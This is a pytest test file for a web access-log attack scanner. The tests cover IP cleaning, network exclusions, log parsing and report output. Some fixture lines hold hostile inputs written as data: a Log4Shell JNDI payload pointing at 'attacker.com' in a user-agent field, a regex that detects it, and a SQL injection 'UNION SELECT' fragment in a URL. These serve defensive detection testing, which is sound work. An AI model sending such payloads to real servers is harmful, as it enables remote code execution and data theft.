"""Tests covering edge cases, messy real-world logs, and multi-vector inspection."""
import json
from pathlib import Path
import pytest
from scalp.cli import main
from scalp.core.engine import ScalpEngine
from scalp.core.exclusions import NetworkFilter, clean_ip_string
from scalp.core.models import FilterRule, LogEntry
from scalp.core.parser import LogParser
from scalp.core.rules import RuleLoader
from scalp.reporters.html import HtmlReporter
from scalp.reporters.json_rep import JsonReporter
from scalp.reporters.text import TextReporter


def test_clean_ip_string_strips_brackets_and_ports():
    assert clean_ip_string("[::1]") == "::1"
    assert clean_ip_string("[2001:db8::1]:8080") == "2001:db8::1"
    assert clean_ip_string("192.168.1.1:8000") == "192.168.1.1"
    assert clean_ip_string("10.0.0.1") == "10.0.0.1"
    assert clean_ip_string("localhost") == "localhost"
    assert clean_ip_string("") == ""


def test_network_filter_handles_bracketed_and_ported_ips():
    nf = NetworkFilter(excluded_ips=["127.0.0.1", "::1", "localhost"], excluded_subnets=["192.168.1.0/24"])
    # Bracketed IPv6
    assert nf.is_excluded("[::1]") is True
    assert nf.is_excluded("[::1]:8080") is True
    # IPv4 with port
    assert nf.is_excluded("127.0.0.1:5000") is True
    # CIDR with port
    assert nf.is_excluded("192.168.1.55:8443") is True
    # Hostname exclusion
    assert nf.is_excluded("localhost") is True
    assert nf.is_excluded("localhost:8080") is True
    # Non-excluded
    assert nf.is_excluded("10.0.0.1") is False


def test_parser_handles_hostnames_bracketed_ipv6_and_escaped_quotes():
    # Hostname as client IP
    line_host = 'localhost - - [10/Oct/2024:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "curl/7.68.0"'
    entry_host = LogParser.parse_line(line_host)
    assert entry_host is not None
    assert entry_host.ip == "localhost"
    assert entry_host.url == "/index.html"

    # Bracketed IPv6 with port
    line_v6 = '[2001:db8::1]:8080 - - [10/Oct/2024:13:55:36 +0000] "GET /admin HTTP/1.1" 200 500 "-" "Mozilla/5.0"'
    entry_v6 = LogParser.parse_line(line_v6)
    assert entry_v6 is not None
    assert entry_v6.ip == "[2001:db8::1]:8080"

    # Escaped quotes in User-Agent and Referrer
    line_quotes = '127.0.0.1 - - [10/Oct/2024:13:55:36 +0000] "GET /test HTTP/1.1" 200 100 "https://example.com/\\"quoted\\"" "Mozilla/5.0 \\"SpecialAgent\\""'
    entry_quotes = LogParser.parse_line(line_quotes)
    assert entry_quotes is not None
    assert 'SpecialAgent' in (entry_quotes.user_agent or "")

    # URL with spaces in malformed HTTP request
    line_spaces = '127.0.0.1 - - [10/Oct/2024:13:55:36 +0000] "GET /search?q=1 UNION SELECT 1 HTTP/1.1" 200 100 "-" "-"'
    entry_spaces = LogParser.parse_line(line_spaces)
    assert entry_spaces is not None
    assert entry_spaces.url == "/search?q=1 UNION SELECT 1"


def test_engine_detects_attacks_in_user_agent_and_referrer():
    rule = FilterRule(
        rule_id="80",
        pattern=r"\$\{jndi:(?:ldap|rmi|dns):",
        description="Log4Shell JNDI injection",
        impact=10,
        tags={"log4j"},
    )
    engine = ScalpEngine(rules=[rule])

    # Attack in User-Agent (URL is completely innocent)
    log_line = '1.2.3.4 - - [10/Oct/2024:12:00:00 +0000] "GET /index.html HTTP/1.1" 200 500 "-" "${jndi:ldap://attacker.com/exploit}"'
    entry = LogParser.parse_line(log_line)
    assert entry is not None

    temp_log = Path("test_ua_attack.log")
    temp_log.write_text(log_line + "\n", encoding="utf-8")
    try:
        res = engine.scan_file(str(temp_log))
        assert len(res.matches) == 1
        assert res.matches[0].tag == "log4j"
        assert res.matches[0].matched_field == "user_agent"
    finally:
        if temp_log.exists():
            temp_log.unlink()


def test_rule_without_tags_defaults_to_general_and_is_not_dropped():
    rule = FilterRule(
        rule_id="999",
        pattern=r"secret_admin_bypass",
        description="Rule with empty tags",
        impact=8,
        tags=set(),  # empty tags
    )
    engine = ScalpEngine(rules=[rule])
    log_line = '1.2.3.4 - - [10/Oct/2024:12:00:00 +0000] "GET /secret_admin_bypass HTTP/1.1" 200 500 "-" "-"'
    temp_log = Path("test_empty_tag.log")
    temp_log.write_text(log_line + "\n", encoding="utf-8")
    try:
        res = engine.scan_file(str(temp_log))
        assert len(res.matches) == 1
        assert res.matches[0].rule.rule_id == "999"
        assert res.matches[0].tag == "general"
    finally:
        if temp_log.exists():
            temp_log.unlink()


def test_cli_generates_reports_on_clean_logs_when_format_is_requested(tmp_path):
    clean_log = tmp_path / "clean_access.log"
    clean_log.write_text(
        '127.0.0.1 - - [10/Oct/2024:12:00:00 +0000] "GET /home HTTP/1.1" 200 100 "-" "curl/7.68.0"\n',
        encoding="utf-8",
    )
    out_dir = tmp_path / "output"

    code = main([
        "-l", str(clean_log),
        "-o", str(out_dir),
        "--json",
        "--html",
        "--text",
    ])
    assert code == 0

    json_files = list(out_dir.glob("*.json"))
    html_files = list(out_dir.glob("*.html"))
    text_files = list(out_dir.glob("*.txt"))

    assert len(json_files) == 1
    assert len(html_files) == 1
    assert len(text_files) == 1

    with open(json_files[0], "r", encoding="utf-8") as f:
        data = json.load(f)
        assert data["summary"]["total_matches"] == 0
        assert data["summary"]["processed_lines"] == 1
